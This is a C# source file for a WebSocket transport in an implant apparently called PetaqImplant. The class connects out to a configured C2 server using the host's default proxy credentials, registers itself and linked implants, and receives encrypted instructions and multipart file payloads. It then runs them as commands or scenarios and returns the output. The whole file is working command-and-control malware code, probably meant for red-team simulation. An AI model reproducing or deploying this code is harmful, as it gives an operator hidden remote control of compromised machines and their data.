using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;

namespace PetaqImplant
{
    public class WebSocketServiceSocket : ImplantServiceSocket
    {
        public static ClientWebSocket webSocket;
        private const int receiveChunkSize = 300000;

        public override void Start()
        {
            Console.WriteLine("Connecting to {0}", Program.configuration["C2CONF"]);

            // create a websocket object
            webSocket = new ClientWebSocket();

            // get the default proxy if there is
            webSocket.Options.Proxy = new System.Net.WebProxy();

            // get the credentials for the proxy if there is
            webSocket.Options.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;

            // connect to the websocket in configuration
            Console.Error.WriteLine("Linking to the C2 via websocket... ");
            webSocket.ConnectAsync(new Uri(Program.configuration["C2CONF"]), CancellationToken.None).Wait();
            Console.WriteLine("The websocket connection is successfully established.");

            // register the implant information
            Program.Register();

            // regist the the linked implants
            Program.RegisterLinkedImplants();

            // ask registration from all linked implants
            Program.AskRegistrationsFromAllLinkedImplants();

            // ask route updates from all linked implants
            Program.AskRouteUpdatesFromAllLinkedImplants();

            StartAsync().Wait();
        }

        public override bool Send(string data = "")
        {
            if (data == "") return false;
            SendAsync(data).Wait();
            return true;
        }

        public async Task StartAsync()
        {
            await Task.WhenAll(Receive(), SendAsync());
        }

        public async Task SendAsync(string data = "")
        {
            if (data == "") return;

            

            try
            {
                // inform the C2 about the size
                string buffer_header = "buffer " + data.Length.ToString();
                string buffer_header_enc = Common.Encrypt(buffer_header);

                // add the buffer header before the data
                string null_bytes = new String('\0' , (50 - buffer_header_enc.Length));
                string buffer = buffer_header_enc + null_bytes + data;
                byte[] buffer_bytes = Encoding.UTF8.GetBytes(buffer);

                // send the data with buffer header
                await webSocket.SendAsync(new ArraySegment<byte>(buffer_bytes), WebSocketMessageType.Text, true, CancellationToken.None);
                
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Socket is unreachable. {0}",e);
                StopAsync(true).Wait();
            }
        }

        public async Task Receive()
        {
            try
            {
                while (webSocket.State == WebSocketState.Open)
                {
                    Console.Error.WriteLine("Waiting for an instruction...");
                    byte[] rbuffer = new byte[receiveChunkSize];
                    var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
                    string instruction = Regex.Replace((string)Encoding.UTF8.GetString(rbuffer),"\0", string.Empty);
                    instruction = Common.Decrypt(instruction);
                    Console.Error.WriteLine("Got an instruction:\n{0}",instruction);


                    //If message is multi-part, get the second part and then construct the instruction
                    if (instruction.Contains("MULTIPARTTRANSMISSION"))
                    {
                        Console.Error.WriteLine("Getting second part of the instruction...");
                        int partialChunkSize;
                        string clearinstruction;
                        string partialData = "";
                        // Get the data size and reconstruct the instruction
                        if (instruction.StartsWith("MULTIPARTTRANSMISSION"))
                        {
                            // Get the data size to read the buffer
                            partialChunkSize = int.Parse(Regex.Split(instruction," ")[1]);
                            clearinstruction = String.Join(" ", Regex.Split(instruction," ").SubArray(2, Regex.Split(instruction," ").Length - 2));

                            while (partialData.Length < partialChunkSize)
                            {
                                // Receive the partial data and decrypt
                                byte[] pbuffer = new byte[partialChunkSize- partialData.Length];

                                result = await webSocket.ReceiveAsync(new ArraySegment<byte>(pbuffer), CancellationToken.None);
                                partialData += Regex.Replace((string)Encoding.UTF8.GetString(pbuffer), "\0", string.Empty);

                            }

                            partialData = Common.Decrypt(partialData);
                        }
                        else
                        {

                            // Get the data size to read the buffer and add transmit header (transmit ID)
                            partialChunkSize = int.Parse(Regex.Split(instruction," ")[3]);

                            // Reconstruct the transmission
                            clearinstruction = "transmit " + Regex.Split(instruction," ")[1] + " " + String.Join(" ", Regex.Split(instruction," ").SubArray(4, Regex.Split(instruction," ").Length - 4));


                            while (partialData.Length < partialChunkSize)
                            {
                                // Receive the partial data and decrypt
                                byte[] pbuffer = new byte[partialChunkSize - partialData.Length];
                                result = await webSocket.ReceiveAsync(new ArraySegment<byte>(pbuffer), CancellationToken.None);
                                partialData += Regex.Replace((string)Encoding.UTF8.GetString(pbuffer), "\0", string.Empty);

                            }

                            partialData = Common.Decrypt(partialData);
                            // As format seen below, remove the transmit and ID
                            // transmit V8OLRLP49S3OR1J3TJ3E MjMuamtsbDIzaWg0MzIK
                            partialData = Regex.Split(partialData," ")[2];
                        }

                        
                        // add the partial data to the reconstructed instruction
                        clearinstruction = Regex.Replace(clearinstruction,"FILECONTENTPLACEHOLDER",partialData);
                        instruction = clearinstruction;
                    }

                    //Console.Error.WriteLine(instruction);

                    // If scenario is requested call scenario, otherwise run instructions
                    if (instruction.StartsWith("scenario"))
                    {
                        if (Regex.Split(instruction," ").Length <3)
                        {
                            // Set the socket as the Console output
                            Program.consoleIO = Console.Out;
                            Console.SetOut(new SocketWriter());
                            // Raise the error
                            Console.WriteLine("Usage: scenario ImplantID filepath");
                        }
                        else
                        {
                            // scenario instruction format:
                            // scenario file BASE64STRING
                            string scenario_b64 = Regex.Split(instruction," ")[2];
                            // send the Base64 encoded scenario to run
                            PetaqImplant.Scenario.Run(scenario_b64);
                        }

                    }
                    else
                    {
                        // run the instruction received
                        PetaqImplant.Instructions.Instruct(instruction, new SocketWriter());
                    }

                    

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        Console.Error.WriteLine("Socket is closing...");
                        await StopAsync();
                    }

                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("The service stopped responding: {0}", e);
                await StopAsync(true);
            }
        }

        public override void Stop()
        {
            StopAsync().Wait();
        }

        public async Task StopAsync(bool unreachable = false)
        {
            Program.ConsoleReset();
            Console.Error.WriteLine("The C2 socket is closing.");
            if (! unreachable)
            {
                try
                {
                    await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("Failed to close the async socket. {0}", e);
                }
            }

        }
    }
}
